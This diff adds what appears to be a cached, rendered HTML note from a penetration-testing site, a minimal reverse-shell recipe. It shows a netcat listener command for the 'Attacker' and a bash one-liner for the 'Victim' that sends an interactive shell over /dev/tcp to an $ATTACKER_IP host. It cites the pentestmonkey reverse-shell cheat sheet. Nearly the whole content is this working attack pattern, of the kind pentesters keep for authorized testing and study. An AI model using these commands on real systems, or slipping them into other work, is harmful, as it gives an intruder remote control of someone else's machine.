@@ -1,0 +1,13 @@
+I"Ê<h2 id="attacker">Attacker</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 22222
+</code></pre></div></div>
+
+<h2 id="victim">Victim</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;<span class="nv">$ATTACKER_IP</span><span class="o">&gt;</span>/22222 0&gt;&amp;1
+</code></pre></div></div>
+
+<hr />
+<ol>
+  <li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
+</ol>
+:ET
